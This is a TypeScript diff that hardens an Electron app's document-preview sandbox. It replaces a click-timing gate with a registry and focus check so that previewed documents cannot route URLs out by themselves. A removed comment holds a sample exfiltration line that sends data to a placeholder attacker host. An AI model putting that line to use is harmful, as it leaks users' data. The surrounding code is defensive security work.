@@ -8,33 +8,23 @@ import { getDocPreviewGrant } from './doc-preview-grant-registry'
 
 type PreviewLinkSink = { send: (channel: string, payload: { url: string }) => void }
 
+type PreviewGuestRegistration = {
+  linkSink: PreviewLinkSink
+  readBoundGrantId: () => string | null
+  isFocused: () => boolean
+}
+
 /**
- * Why a gesture gate on the only way out: the document may read its whole grant over
- * `connect-src 'self'`, and the external-link route ends in a real Orca browser tab with full
- * network. Without this, `location.href = 'https://attacker/?d=' + data` running on its own
- * exfiltrates everything the grant covers, past both the CSP and the session's request fence.
- * A human clicking a link is unaffected; a script with no one at the keyboard reaches nothing.
+ * Why a registry: the click report arrives on an IPC channel, where the only thing main holds is
+ * the sender. Without this, "is this a live preview guest, and which grant is it bound to" has no
+ * answer, and any WebContents that learned the channel name would be routed out.
  */
-const EXTERNAL_LINK_GESTURE_WINDOW_MS = 2_000
-
-/** Activation-shaped input only — hovering, scrolling or moving a pointer is nobody asking to leave. */
-const ACTIVATING_INPUT_TYPES: ReadonlySet<string> = new Set([
-  'mouseDown',
-  'mouseUp',
-  'keyDown',
-  'char',
-  'touchStart',
-  'touchEnd',
-  'gestureTap',
-  'pointerDown',
-  'pointerUp'
-])
+const previewGuests = new WeakMap<object, PreviewGuestRegistration>()
 
 /**
- * The preview guest renders a workspace document, not the web: it may only move
- * within its own grant. External http(s) targets — plain clicks and
- * `target="_blank"` alike — leave as a new Orca browser tab through the normal
- * machinery instead of navigating the preview or spawning a native popup.
+ * The preview guest renders a workspace document, not the web: it may only move within its own
+ * grant, and nothing it does by itself leaves the preview. The one route out is
+ * `reportDocPreviewLinkClick`, which answers for a click the reader really made.
  */
 export function installDocPreviewGuestPolicy(
   guest: Electron.WebContents,
@@ -43,40 +33,15 @@ export function installDocPreviewGuestPolicy(
   // Why: the first commit is the renderer-set src, already admitted by will-attach-webview;
   // latching it pins every later navigation to that one grant.
   let boundGrantId: string | null = null
-  let lastGenuineInputAt = 0
 
-  const recordGenuineInput = (): void => {
-    lastGenuineInputAt = Date.now()
-  }
-
-  // Why both events: `input-event` carries pointer and touch, `before-input-event` is the keyboard
-  // signal a guest emits regardless; either alone leaves some real user unable to follow a link.
-  guest.on('input-event', (_event, inputEvent) => {
-    if (ACTIVATING_INPUT_TYPES.has(inputEvent.type)) {
-      recordGenuineInput()
-    }
+  previewGuests.set(guest, {
+    linkSink,
+    readBoundGrantId: () => boundGrantId,
+    isFocused: () => guest.isFocused()
   })
-  guest.on('before-input-event', (_event, input) => {
-    if (input.type === 'keyDown') {
-      recordGenuineInput()
-    }
+  guest.once('destroyed', () => {
+    previewGuests.delete(guest)
   })
-
-  /** Why spent rather than merely checked: one gesture buys one tab, so a loop cannot ride a single click. */
-  const spendGenuineInput = (): boolean => {
-    const isRecent =
-      lastGenuineInputAt > 0 && Date.now() - lastGenuineInputAt <= EXTERNAL_LINK_GESTURE_WINDOW_MS
-    lastGenuineInputAt = 0
-    return isRecent
-  }
-
-  const openExternally = (rawUrl: string): void => {
-    const externalUrl = normalizeExternalBrowserUrl(rawUrl)
-    if (!externalUrl || !spendGenuineInput()) {
-      return
-    }
-    linkSink.send(DOC_PREVIEW_EXTERNAL_LINK_CHANNEL, { url: externalUrl })
-  }
 
   const isAllowedPreviewNavigation = (rawUrl: string): boolean => {
     const target = parseDocPreviewUrl(rawUrl)
@@ -86,12 +51,16 @@ export function installDocPreviewGuestPolicy(
     return boundGrantId === null || target.grantId === boundGrantId
   }
 
+  /**
+   * Why deny-only, with nothing routed: a navigation the guest starts cannot be attributed to the
+   * reader. The document may read its whole grant over `connect-src 'self'`, so routing an
+   * unattributable URL to a real browser tab with full network is how those bytes would get out.
+   */
   const navigationGuard = (event: Electron.Event, url: string): void => {
     if (isAllowedPreviewNavigation(url)) {
       return
     }
     event.preventDefault()
-    openExternally(url)
   }
 
   guest.on('did-start-navigation', (details) => {
@@ -110,16 +79,43 @@ export function installDocPreviewGuestPolicy(
     if (details.isMainFrame || isAllowedPreviewNavigation(details.url)) {
       return
     }
-    // Why blocked rather than routed out like a main-frame click: a subframe navigates on its own,
-    // so opening a tab for it would let a document spawn browser tabs the user never asked for.
     details.preventDefault()
   })
-  guest.setWindowOpenHandler(({ url }) => {
-    openExternally(url)
-    // Why: previews never own native child windows; every popup target becomes an Orca tab or nothing.
-    return { action: 'deny' }
-  })
+  // Why deny with nothing routed: previews own no native child windows, and a popup the document
+  // asked for is the document asking, not the reader. A link the reader presses is intercepted
+  // before Chromium ever considers a popup.
+  guest.setWindowOpenHandler(() => ({ action: 'deny' }))
   // Why a second fence for one API: WebRTC opens UDP straight from the network stack, so neither the
   // response CSP nor the session's request filter ever sees it. This is the only layer that can.
   enforceBrowserRouteWebRtcPolicy(guest, () => {})
+}
+
+function isWebUrl(url: string): boolean {
+  return url.startsWith('http://') || url.startsWith('https://')
+}
+
+/**
+ * The only way a URL leaves a preview. Every condition is load-bearing: the sender must be a live
+ * preview guest still bound to a grant, it must be the contents the reader is looking at, and the
+ * target must be the web. Anything else is dropped without a trace the document could observe.
+ */
+export function reportDocPreviewLinkClick(sender: Electron.WebContents, rawUrl: string): void {
+  const registration = previewGuests.get(sender)
+  if (!registration) {
+    return
+  }
+  const boundGrantId = registration.readBoundGrantId()
+  if (boundGrantId === null || !getDocPreviewGrant(boundGrantId)) {
+    return
+  }
+  // Why focus and not just the preload's trusted-click check: that check runs inside the guest, so
+  // it holds only while the guest renderer does. Focus is the half main can verify for itself.
+  if (!registration.isFocused()) {
+    return
+  }
+  const externalUrl = normalizeExternalBrowserUrl(rawUrl)
+  if (!externalUrl || !isWebUrl(externalUrl)) {
+    return
+  }
+  registration.linkSink.send(DOC_PREVIEW_EXTERNAL_LINK_CHANNEL, { url: externalUrl })
 }
